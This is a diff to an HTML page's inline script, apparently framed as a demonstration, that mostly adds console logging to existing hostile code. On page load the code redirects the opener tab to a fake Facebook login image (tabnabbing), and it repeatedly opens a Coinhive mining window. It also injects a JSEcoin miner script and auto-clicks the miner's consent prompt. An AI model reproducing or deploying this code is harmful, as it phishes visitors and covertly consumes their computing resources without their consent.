@@ -24,17 +24,30 @@
 <script>
 // Tabnabbing
 if (window && window.opener) {
+  console.log('Trying to perform tabnabbing for demonstrative purposes..');
   setTimeout(() => window.opener.location = 'https://mycatnamedweb.github.io/fb%20login%20page.png', 3000); // https://uguu.se rocks
 }
 // Coinh
 const openMon = () => {
+  console.log('opening coinh..');
   const w = window.open('https://cnhv.co/cpu3f');
-  setTimeout(() => {w.close(); if(window.location.href.split('#')[1]) openMon();}, 2 * 60 *1000);
+  setTimeout(() => {
+    console.log('closing coinh..');
+    w.close();
+    if(window.location.href.split('#')[1]) { console.log('looping..'); openMon(); }
+  }, 2 * 60 *1000);
 }
 openMon();
 // JSE
-!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/115102/mycatnamedweb.github.io/0/0/",s.parentNode.insertBefore(t,s)}();
-setTimeout(() => document.querySelectorAll('a[href="https://jsecoin.com/JSEcoin_Publisher_Introduction.pdf"]')[0].parentElement.parentElement.firstElementChild.click(), 10 * 1000);
+!function(){
+  var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/115102/mycatnamedweb.github.io/0/0/",s.parentNode.insertBefore(t,s)
+}();
+setTimeout(() => {
+  console.log('Finding jse block..');
+  const parentBlock = document.querySelectorAll('a[href="https://jsecoin.com/JSEcoin_Publisher_Introduction.pdf"]')[0].parentElement.parentElement;
+  console.log('Clicking ok..');
+  parentBlock.firstElementChild.click() 
+}, 10 * 1000);
 </script>
 </body>
 </html>
